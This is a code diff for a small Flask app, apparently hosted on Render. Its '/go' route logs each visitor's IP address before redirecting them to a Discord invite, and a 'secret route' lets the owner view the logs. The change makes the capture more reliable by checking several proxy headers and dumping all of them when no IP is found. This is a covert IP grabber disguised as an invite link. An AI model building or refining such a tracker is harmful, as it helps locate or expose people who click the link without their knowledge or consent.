@@ -21,24 +21,28 @@ def home():
 
 @app.route('/go')
 def track():
-    # 1. Try to get the raw string from the environment
-    # This bypasses Flask's automatic processing
-    forwarded_data = request.environ.get('HTTP_X_FORWARDED_FOR', '')
+    # 1. Capture every possible header Render might use
+    headers = {
+        'X-Forwarded-For': request.headers.get('X-Forwarded-For'),
+        'X-Real-IP': request.headers.get('X-Real-IP'),
+        'Remote-Addr': request.remote_addr,
+        'CF-Connecting-IP': request.headers.get('CF-Connecting-IP') # Some proxies use this
+    }
     
-    if forwarded_data:
-        # 2. Render's list looks like: "USER_IP, PROXY_IP, PROXY_IP"
-        # We take the FIRST one.
-        ip = forwarded_data.split(',')[0].strip()
-    else:
-        # 3. If that is empty, check X-Real-IP or remote_addr
-        ip = request.headers.get('X-Real-IP', request.remote_addr)
+    # 2. Try to find the first non-Render IP
+    final_ip = "Unknown"
+    for name, value in headers.items():
+        if value:
+            first_ip = value.split(',')[0].strip()
+            if not first_ip.startswith('209.35') and not first_ip.startswith('10.'):
+                final_ip = first_ip
+                break
+    
+    # 3. If we still fail, log ALL headers so we can see the "map"
+    if final_ip == "Unknown":
+        final_ip = f"DEBUG: {headers}"
 
-    # 4. If we STILL get a Render IP (209.35...), something is wrong with the header.
-    # Let's log 'Check Header' so we know it failed to find your IP.
-    if ip.startswith('209.35'):
-        ip = f"Render-Proxy-Detected: {ip}"
-
-    log_ip(ip)
+    log_ip(final_ip)
     return redirect("https://discord.gg/TMKATk684K")
 
 # Secret route to view your logs in the browser
